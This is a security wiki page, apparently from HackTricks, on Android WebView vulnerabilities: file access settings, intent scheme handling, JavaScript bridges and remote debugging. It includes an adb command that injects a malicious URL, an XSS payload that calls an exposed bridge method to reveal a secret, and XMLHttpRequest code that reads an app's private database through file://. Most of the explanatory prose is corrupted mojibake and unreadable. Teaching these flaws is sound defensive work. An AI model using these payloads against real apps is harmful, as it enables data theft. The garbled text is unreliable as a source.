# Webview Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Guide on WebView Configurations and Security

### Overview of WebView Vulnerabilities

ì•ˆë“œë¡œì´ë“œ ê°œë°œì˜ ì¤‘ìš”í•œ ì¸¡ë©´ì€ WebViewì˜ ì˜¬ë°”ë¥¸ ì²˜ë¦¬ì…ë‹ˆë‹¤. ì´ ê°€ì´ë“œëŠ” WebView ì‚¬ìš©ê³¼ ê´€ë ¨ëœ ìœ„í—˜ì„ ì™„í™”í•˜ê¸° ìœ„í•œ ì£¼ìš” êµ¬ì„± ë° ë³´ì•ˆ ê´€í–‰ì„ ê°•ì¡°í•©ë‹ˆë‹¤.

![WebView Example](<../../.gitbook/assets/image (1190).png>)

### **File Access in WebViews**

ê¸°ë³¸ì ìœ¼ë¡œ WebViewëŠ” íŒŒì¼ ì ‘ê·¼ì„ í—ˆìš©í•©ë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì€ Android API ë ˆë²¨ 3(Cupcake 1.5)ë¶€í„° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” `setAllowFileAccess()` ë©”ì„œë“œë¡œ ì œì–´ë©ë‹ˆë‹¤. **android.permission.READ\_EXTERNAL\_STORAGE** ê¶Œí•œì´ ìˆëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì€ íŒŒì¼ URL ìŠ¤í‚´(`file://path/to/file`)ì„ ì‚¬ìš©í•˜ì—¬ ì™¸ë¶€ ì €ì¥ì†Œì—ì„œ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### **Deprecated Features: Universal and File Access From URLs**

* **Universal Access From File URLs**: ì´ ì‚¬ìš© ì¤‘ë‹¨ëœ ê¸°ëŠ¥ì€ íŒŒì¼ URLì—ì„œ êµì°¨ ì¶œì²˜ ìš”ì²­ì„ í—ˆìš©í•˜ì—¬ ì ì¬ì ì¸ XSS ê³µê²©ìœ¼ë¡œ ì¸í•œ ìƒë‹¹í•œ ë³´ì•ˆ ìœ„í—˜ì„ ì´ˆë˜í–ˆìŠµë‹ˆë‹¤. ê¸°ë³¸ ì„¤ì •ì€ Android Jelly Bean ë° ì´í›„ ë²„ì „ì„ ëŒ€ìƒìœ¼ë¡œ í•˜ëŠ” ì•±ì— ëŒ€í•´ ë¹„í™œì„±í™”(`false`)ë˜ì–´ ìˆìŠµë‹ˆë‹¤.
* ì´ ì„¤ì •ì„ í™•ì¸í•˜ë ¤ë©´ `getAllowUniversalAccessFromFileURLs()`ë¥¼ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤.
* ì´ ì„¤ì •ì„ ìˆ˜ì •í•˜ë ¤ë©´ `setAllowUniversalAccessFromFileURLs(boolean)`ë¥¼ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤.
* **File Access From File URLs**: ì´ ê¸°ëŠ¥ë„ ì‚¬ìš© ì¤‘ë‹¨ë˜ì—ˆìœ¼ë©°, ë‹¤ë¥¸ íŒŒì¼ ìŠ¤í‚´ URLì—ì„œ ì½˜í…ì¸ ì— ëŒ€í•œ ì ‘ê·¼ì„ ì œì–´í–ˆìŠµë‹ˆë‹¤. ìœ ë‹ˆë²„ì„¤ ì ‘ê·¼ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ ê¸°ë³¸ê°’ì€ ë³´ì•ˆì„ ê°•í™”í•˜ê¸° ìœ„í•´ ë¹„í™œì„±í™”ë˜ì–´ ìˆìŠµë‹ˆë‹¤.
* í™•ì¸í•˜ë ¤ë©´ `getAllowFileAccessFromFileURLs()`ë¥¼ ì‚¬ìš©í•˜ê³  ì„¤ì •í•˜ë ¤ë©´ `setAllowFileAccessFromFileURLs(boolean)`ë¥¼ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤.

#### **Secure File Loading**

ìì‚° ë° ë¦¬ì†ŒìŠ¤ì— ì ‘ê·¼í•˜ë©´ì„œ íŒŒì¼ ì‹œìŠ¤í…œ ì ‘ê·¼ì„ ë¹„í™œì„±í™”í•˜ë ¤ë©´ `setAllowFileAccess()` ë©”ì„œë“œë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. Android R ì´ìƒì—ì„œëŠ” ê¸°ë³¸ ì„¤ì •ì´ `false`ì…ë‹ˆë‹¤.

* `getAllowFileAccess()`ë¡œ í™•ì¸í•˜ì‹­ì‹œì˜¤.
* `setAllowFileAccess(boolean)`ë¡œ í™œì„±í™” ë˜ëŠ” ë¹„í™œì„±í™”í•˜ì‹­ì‹œì˜¤.

#### **WebViewAssetLoader**

**WebViewAssetLoader** í´ë˜ìŠ¤ëŠ” ë¡œì»¬ íŒŒì¼ì„ ë¡œë“œí•˜ê¸° ìœ„í•œ í˜„ëŒ€ì ì¸ ì ‘ê·¼ ë°©ì‹ì…ë‹ˆë‹¤. ì´ëŠ” ë¡œì»¬ ìì‚° ë° ë¦¬ì†ŒìŠ¤ì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ http(s) URLì„ ì‚¬ìš©í•˜ë©°, ë™ì¼ ì¶œì²˜ ì •ì±…ì— ë§ì¶° CORS ê´€ë¦¬ë¥¼ ìš©ì´í•˜ê²Œ í•©ë‹ˆë‹¤.

### loadUrl

ì´ê²ƒì€ ì›¹ë·°ì—ì„œ ì„ì˜ì˜ URLì„ ë¡œë“œí•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ì¼ë°˜ì ì¸ í•¨ìˆ˜ì…ë‹ˆë‹¤:
```java
webview.loadUrl("<url here>")
```
ë¬¼ë¡ , ì ì¬ì ì¸ ê³µê²©ìëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ë¡œë“œí•  **URL**ì„ ì ˆëŒ€ ì œì–´í•  ìˆ˜ ì—†ì–´ì•¼ í•©ë‹ˆë‹¤.

### **JavaScript ë° Intent Scheme ì²˜ë¦¬**

* **JavaScript**: WebViewsì—ì„œ ê¸°ë³¸ì ìœ¼ë¡œ ë¹„í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©°, `setJavaScriptEnabled()`ë¥¼ í†µí•´ í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì ì ˆí•œ ì•ˆì „ ì¥ì¹˜ ì—†ì´ JavaScriptë¥¼ í™œì„±í™”í•˜ë©´ ë³´ì•ˆ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì£¼ì˜ê°€ í•„ìš”í•©ë‹ˆë‹¤.
* **Intent Scheme**: WebViewsëŠ” `intent` ìŠ¤í‚´ì„ ì²˜ë¦¬í•  ìˆ˜ ìˆìœ¼ë©°, ì‹ ì¤‘í•˜ê²Œ ê´€ë¦¬í•˜ì§€ ì•Šìœ¼ë©´ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë…¸ì¶œëœ WebView ë§¤ê°œë³€ìˆ˜ "support\_url"ì´ XSS ê³µê²©ì„ ì‹¤í–‰í•˜ëŠ” ë° ì•…ìš©ë  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ìˆì—ˆìŠµë‹ˆë‹¤.

![Vulnerable WebView](<../../.gitbook/assets/image (1191).png>)

adbë¥¼ ì‚¬ìš©í•œ ì•…ìš© ì˜ˆì‹œ:

{% code overflow="wrap" %}
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView â€“es support_url "https://example.com/xss.html"
```
{% endcode %}

### Javascript Bridge

AndroidëŠ” **JavaScript**ê°€ WebViewì—ì„œ **ë„¤ì´í‹°ë¸Œ Android ì•± ê¸°ëŠ¥**ì„ í˜¸ì¶œí•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ì´ëŠ” `addJavascriptInterface` ë©”ì„œë“œë¥¼ í™œìš©í•˜ì—¬ JavaScriptì™€ ë„¤ì´í‹°ë¸Œ Android ê¸°ëŠ¥ì„ í†µí•©í•¨ìœ¼ë¡œì¨ ì´ë£¨ì–´ì§€ë©°, ì´ë¥¼ _WebView JavaScript bridge_ë¼ê³  í•©ë‹ˆë‹¤. ì´ ë©”ì„œë“œëŠ” WebView ë‚´ì˜ ëª¨ë“  í˜ì´ì§€ê°€ ë“±ë¡ëœ JavaScript Interface ê°ì²´ì— ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ í•˜ë¯€ë¡œ, ì´ëŸ¬í•œ ì¸í„°í˜ì´ìŠ¤ë¥¼ í†µí•´ ë¯¼ê°í•œ ì •ë³´ê°€ ë…¸ì¶œë  ê²½ìš° ë³´ì•ˆ ìœ„í—˜ì´ ë°œìƒí•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì£¼ì˜ê°€ í•„ìš”í•©ë‹ˆë‹¤.

* **Android 4.2 ì´í•˜ ë²„ì „ì„ íƒ€ê²Ÿìœ¼ë¡œ í•˜ëŠ” ì•±ì€ ê·¹ë„ì˜ ì£¼ì˜ê°€ í•„ìš”**í•©ë‹ˆë‹¤. ì´ëŠ” ì•…ì„± JavaScriptë¥¼ í†µí•´ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ í—ˆìš©í•˜ëŠ” ì·¨ì•½ì ì´ ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

#### JavaScript Bridge êµ¬í˜„í•˜ê¸°

* **JavaScript ì¸í„°í˜ì´ìŠ¤**ëŠ” ë„¤ì´í‹°ë¸Œ ì½”ë“œì™€ ìƒí˜¸ì‘ìš©í•  ìˆ˜ ìˆìœ¼ë©°, í´ë˜ìŠ¤ ë©”ì„œë“œê°€ JavaScriptì— ë…¸ì¶œë˜ëŠ” ì˜ˆì‹œì—ì„œ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
* JavaScript BridgeëŠ” WebViewì— ì¸í„°í˜ì´ìŠ¤ë¥¼ ì¶”ê°€í•˜ì—¬ í™œì„±í™”ë©ë‹ˆë‹¤:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```
* JavaScriptë¥¼ í†µí•œ ì ì¬ì  ì•…ìš©, ì˜ˆë¥¼ ë“¤ì–´ XSS ê³µê²©ì„ í†µí•´ ë…¸ì¶œëœ Java ë©”ì„œë“œë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<script>alert(javascriptBridge.getSecret());</script>
```
* ìœ„í—˜ì„ ì™„í™”í•˜ê¸° ìœ„í•´, **JavaScript ë¸Œë¦¬ì§€ ì‚¬ìš©ì„** APKì™€ í•¨ê»˜ ì œê³µëœ ì½”ë“œë¡œ ì œí•œí•˜ê³  ì›ê²© ì†ŒìŠ¤ì—ì„œ JavaScript ë¡œë”©ì„ ë°©ì§€í•˜ì‹­ì‹œì˜¤. êµ¬í˜• ì¥ì¹˜ì˜ ê²½ìš° ìµœì†Œ API ìˆ˜ì¤€ì„ 17ë¡œ ì„¤ì •í•˜ì‹­ì‹œì˜¤.

### ë¦¬í”Œë ‰ì…˜ ê¸°ë°˜ ì›ê²© ì½”ë“œ ì‹¤í–‰ (RCE)

* ë¬¸ì„œí™”ëœ ë°©ë²•ì„ í†µí•´ íŠ¹ì • í˜ì´ë¡œë“œë¥¼ ì‹¤í–‰í•˜ì—¬ RCEë¥¼ ë‹¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ `@JavascriptInterface` ì£¼ì„ì€ ë¬´ë‹¨ ë©”ì„œë“œ ì ‘ê·¼ì„ ë°©ì§€í•˜ì—¬ ê³µê²© í‘œë©´ì„ ì œí•œí•©ë‹ˆë‹¤.

### ì›ê²© ë””ë²„ê¹…

* **ì›ê²© ë””ë²„ê¹…**ì€ **Chrome ê°œë°œì ë„êµ¬**ë¥¼ ì‚¬ìš©í•˜ì—¬ ê°€ëŠ¥í•˜ë©°, WebView ì½˜í…ì¸  ë‚´ì—ì„œ ìƒí˜¸ì‘ìš© ë° ì„ì˜ì˜ JavaScript ì‹¤í–‰ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤.

#### ì›ê²© ë””ë²„ê¹… í™œì„±í™”

* ì›ê²© ë””ë²„ê¹…ì€ ë‹¤ìŒì„ í†µí•´ ì• í”Œë¦¬ì¼€ì´ì…˜ ë‚´ ëª¨ë“  WebViewì— ëŒ€í•´ í™œì„±í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
* ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë””ë²„ê¹… ê°€ëŠ¥ ìƒíƒœì— ë”°ë¼ ë””ë²„ê¹…ì„ ì¡°ê±´ë¶€ë¡œ í™œì„±í™”í•˜ë ¤ë©´:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## ì„ì˜ íŒŒì¼ ì¶”ì¶œ

* XMLHttpRequestë¥¼ ì‚¬ìš©í•˜ì—¬ ì„ì˜ íŒŒì¼ì˜ ì¶”ì¶œì„ ì‹œì—°í•©ë‹ˆë‹¤:
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## References

* [https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
* [https://github.com/authenticationfailure/WheresMyBrowser.Android](https://github.com/authenticationfailure/WheresMyBrowser.Android)
* [https://developer.android.com/reference/android/webkit/WebView](https://developer.android.com/reference/android/webkit/WebView)
* [https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
* [https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
